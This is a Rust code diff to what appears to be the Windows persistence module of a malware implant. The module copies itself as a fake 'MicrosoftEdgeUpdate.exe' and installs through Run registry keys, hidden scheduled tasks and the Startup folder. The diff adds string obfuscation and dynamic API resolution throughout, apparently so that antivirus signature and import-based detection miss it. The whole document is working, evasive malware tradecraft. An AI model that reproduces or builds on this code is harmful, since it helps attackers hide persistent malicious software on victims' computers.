@@ -6,6 +6,8 @@
 //!
 //! Single-technique shorthand (PERSIST:install/remove/check) is also handled.
 
+use crate::s;
+
 #[cfg(unix)]
 use std::path::PathBuf;
 
@@ -69,6 +71,7 @@ pub fn remove_all() -> String {
 
 #[cfg(windows)]
 mod win {
+    use crate::s;
     use super::PersistResult;
     use std::os::windows::process::CommandExt;
     use std::path::PathBuf;
@@ -135,21 +138,18 @@ mod win {
     // ── Helpers ───────────────────────────────────────────────────────────────
 
     fn is_admin() -> bool {
-        use windows_sys::Win32::Security::{
-            CheckTokenMembership, CreateWellKnownSid, WinBuiltinAdministratorsSid,
-        };
-        use windows_sys::Win32::Foundation::BOOL;
+        const WIN_BUILTIN_ADMINISTRATORS_SID: u32 = 26;
         unsafe {
             let mut sid = [0u8; 68];
             let mut sid_size: u32 = sid.len() as u32;
-            if CreateWellKnownSid(
-                WinBuiltinAdministratorsSid,
+            if crate::dynapi::create_well_known_sid(
+                WIN_BUILTIN_ADMINISTRATORS_SID,
                 std::ptr::null_mut(),
                 sid.as_mut_ptr() as *mut _,
                 &mut sid_size,
             ) == 0 { return false; }
-            let mut is_member: BOOL = 0;
-            CheckTokenMembership(0, sid.as_ptr() as *mut _, &mut is_member) != 0
+            let mut is_member: i32 = 0;
+            crate::dynapi::check_token_membership(0, sid.as_ptr() as *mut _, &mut is_member) != 0
                 && is_member != 0
         }
     }
@@ -157,7 +157,7 @@ mod win {
 
     fn appdata_dir() -> PathBuf {
         let base = std::env::var("APPDATA").unwrap_or_else(|_| ".".to_string());
-        PathBuf::from(base).join("Microsoft").join("EdgeUpdate")
+        PathBuf::from(base).join(s!("Microsoft")).join(s!("EdgeUpdate"))
     }
 
     fn startup_dir() -> PathBuf {
@@ -175,7 +175,7 @@ mod win {
         let dest_dir = appdata_dir();
         std::fs::create_dir_all(&dest_dir)
             .map_err(|e| format!("ERROR: mkdir {}: {}", dest_dir.display(), e))?;
-        let dest = dest_dir.join("MicrosoftEdgeUpdate.exe");
+        let dest = dest_dir.join(&s!("MicrosoftEdgeUpdate.exe"));
         if !dest.exists() {
             std::fs::copy(&exe, &dest)
                 .map_err(|e| format!("ERROR: copy to {}: {}", dest.display(), e))?;
@@ -186,7 +186,7 @@ mod win {
     fn probe_one(id: &str, blob_path: &str) -> String {
         match id {
             "schtask-logon" => {
-                let payload = appdata_dir().join("MicrosoftEdgeUpdate.exe");
+                let payload = appdata_dir().join(&s!("MicrosoftEdgeUpdate.exe"));
                 let task_ok = schtask_exists(TASK_NAME);
                 let file_ok = payload.exists();
                 let st = if task_ok && file_ok { "installed" }
@@ -196,12 +196,12 @@ mod win {
             }
             "registry-run" => {
                 let val_exists = reg_value_exists(
-                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", REG_VALUE);
+                    &s!(r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"), REG_VALUE);
                 let st = if val_exists { "installed" } else { "available" };
                 format!("PROBE:registry-run:{}:user:HKCU Run key — fires at logon", st)
             }
             "startup-folder" => {
-                let dest = startup_dir().join("MicrosoftEdgeUpdate.exe");
+                let dest = startup_dir().join(&s!("MicrosoftEdgeUpdate.exe"));
                 let st = if dest.exists() { "installed" } else { "available" };
                 format!("PROBE:startup-folder:{}:user:User Startup folder — fires at logon", st)
             }
@@ -218,7 +218,7 @@ mod win {
                     return "PROBE:registry-run-hklm:unavailable:admin:Requires admin — HKLM Run key".to_string();
                 }
                 let val_exists = reg_value_exists(
-                    r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", REG_VALUE);
+                    &s!(r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"), REG_VALUE);
                 let st = if val_exists { "installed" } else { "available" };
                 format!("PROBE:registry-run-hklm:{}:admin:HKLM Run key — fires for all users", st)
             }
@@ -230,7 +230,7 @@ mod win {
         let _ = blob_path;
         match id {
             "schtask-logon" => {
-                let payload = appdata_dir().join("MicrosoftEdgeUpdate.exe");
+                let payload = appdata_dir().join(&s!("MicrosoftEdgeUpdate.exe"));
                 let task_ok = schtask_exists(TASK_NAME);
                 let file_ok = payload.exists();
                 if task_ok && file_ok {
@@ -247,14 +247,14 @@ mod win {
                 }
             }
             "registry-run" => {
-                if reg_value_exists(r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", REG_VALUE) {
+                if reg_value_exists(&s!(r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"), REG_VALUE) {
                     format!("ACTIVE: registry-run\n  Key: HKCU\\...\\Run\\{}", REG_VALUE)
                 } else {
                     "NOT INSTALLED: registry-run".to_string()
                 }
             }
             "startup-folder" => {
-                let dest = startup_dir().join("MicrosoftEdgeUpdate.exe");
+                let dest = startup_dir().join(&s!("MicrosoftEdgeUpdate.exe"));
                 if dest.exists() {
                     format!("ACTIVE: startup-folder\n  File: {}", dest.display())
                 } else {
@@ -270,7 +270,7 @@ mod win {
                 }
             }
             "registry-run-hklm" => {
-                if reg_value_exists(r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", REG_VALUE) {
+                if reg_value_exists(&s!(r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"), REG_VALUE) {
                     format!("ACTIVE: registry-run-hklm\n  Key: HKLM\\...\\Run\\{}", REG_VALUE)
                 } else {
                     "NOT INSTALLED: registry-run-hklm".to_string()
@@ -329,7 +329,7 @@ mod win {
         if std::fs::write(&xml_path, xml.as_bytes()).is_err() {
             return PersistResult::Err("ERROR: failed to write task XML".to_string());
         }
-        let status = std::process::Command::new("schtasks")
+        let status = std::process::Command::new(s!("schtasks"))
             .args(["/create", "/tn", TASK_NAME, "/xml",
                    &xml_path.to_string_lossy(), "/f"])
             .creation_flags(CREATE_NO_WINDOW)
@@ -356,13 +356,13 @@ mod win {
     }
 
     fn remove_schtask_logon() -> String {
-        let status = std::process::Command::new("schtasks")
+        let status = std::process::Command::new(s!("schtasks"))
             .args(["/delete", "/tn", TASK_NAME, "/f"])
             .creation_flags(CREATE_NO_WINDOW)
             .stdout(std::process::Stdio::null())
             .stderr(std::process::Stdio::null())
             .status();
-        let dest = appdata_dir().join("MicrosoftEdgeUpdate.exe");
+        let dest = appdata_dir().join(&s!("MicrosoftEdgeUpdate.exe"));
         let _ = std::fs::remove_file(&dest);
         match status {
             Ok(s) if s.success() => format!(
@@ -374,7 +374,7 @@ mod win {
     }
 
     fn schtask_exists(name: &str) -> bool {
-        std::process::Command::new("schtasks")
+        std::process::Command::new(s!("schtasks"))
             .args(["/query", "/tn", name])
             .creation_flags(CREATE_NO_WINDOW)
             .stdout(std::process::Stdio::null())
@@ -413,7 +413,7 @@ mod win {
         if std::fs::write(&xml_path, xml.as_bytes()).is_err() {
             return PersistResult::Err("ERROR: failed to write task XML".to_string());
         }
-        let status = std::process::Command::new("schtasks")
+        let status = std::process::Command::new(s!("schtasks"))
             .args(["/create", "/tn", &task_name, "/xml",
                    &xml_path.to_string_lossy(), "/f"])
             .creation_flags(CREATE_NO_WINDOW)
@@ -432,7 +432,7 @@ mod win {
 
     fn remove_schtask_boot() -> String {
         let task_name = format!("{}-Boot", TASK_NAME);
-        let status = std::process::Command::new("schtasks")
+        let status = std::process::Command::new(s!("schtasks"))
             .args(["/delete", "/tn", &task_name, "/f"])
             .creation_flags(CREATE_NO_WINDOW)
             .stdout(std::process::Stdio::null())
@@ -464,7 +464,7 @@ mod win {
             Ok(d) => d,
             Err(e) => return PersistResult::Err(e),
         };
-        let key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run";
+        let key = &s!(r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run");
         let dest_str = dest.to_string_lossy();
         let reg_val = if dest_str.contains(' ') {
             format!("\"{}\"", dest_str)
@@ -488,14 +488,14 @@ mod win {
     }
 
     fn remove_registry_run() -> String {
-        let key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run";
+        let key = &s!(r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run");
         let status = std::process::Command::new("reg")
             .args(["delete", key, "/v", REG_VALUE, "/f"])
             .creation_flags(CREATE_NO_WINDOW)
             .stdout(std::process::Stdio::null())
             .stderr(std::process::Stdio::null())
             .status();
-        let dest = appdata_dir().join("MicrosoftEdgeUpdate.exe");
+        let dest = appdata_dir().join(&s!("MicrosoftEdgeUpdate.exe"));
         let _ = std::fs::remove_file(&dest);
         match status {
             Ok(s) if s.success() => format!(
@@ -524,7 +524,7 @@ mod win {
             Ok(d) => d,
             Err(e) => return PersistResult::Err(e),
         };
-        let key = r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+        let key = &s!(r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
         let dest_str = dest.to_string_lossy();
         let reg_val = if dest_str.contains(' ') {
             format!("\"{}\"", dest_str)
@@ -548,7 +548,7 @@ mod win {
     }
 
     fn remove_registry_run_hklm() -> String {
-        let key = r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+        let key = &s!(r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
         let status = std::process::Command::new("reg")
             .args(["delete", key, "/v", REG_VALUE, "/f"])
             .creation_flags(CREATE_NO_WINDOW)
@@ -571,7 +571,7 @@ mod win {
         std::fs::create_dir_all(&dest_dir)
             .map_err(|e| PersistResult::Err(format!("ERROR: mkdir startup: {}", e)))
             .ok();
-        let dest = dest_dir.join("MicrosoftEdgeUpdate.exe");
+        let dest = dest_dir.join(&s!("MicrosoftEdgeUpdate.exe"));
         let exe = std::env::current_exe().unwrap_or_else(|_| std::path::PathBuf::from(blob_path));
         if let Err(e) = std::fs::copy(&exe, &dest) {
             return PersistResult::Err(format!("ERROR: copy to startup folder: {}", e));
@@ -583,7 +583,7 @@ mod win {
     }
 
     fn remove_startup_folder() -> String {
-        let dest = startup_dir().join("MicrosoftEdgeUpdate.exe");
+        let dest = startup_dir().join(&s!("MicrosoftEdgeUpdate.exe"));
         let _ = std::fs::remove_file(&dest);
         format!("OK: startup-folder removed\n  File '{}' deleted\nARTIFACT_REMOVED:persist_payload:{}", dest.display(), dest.display())
     }
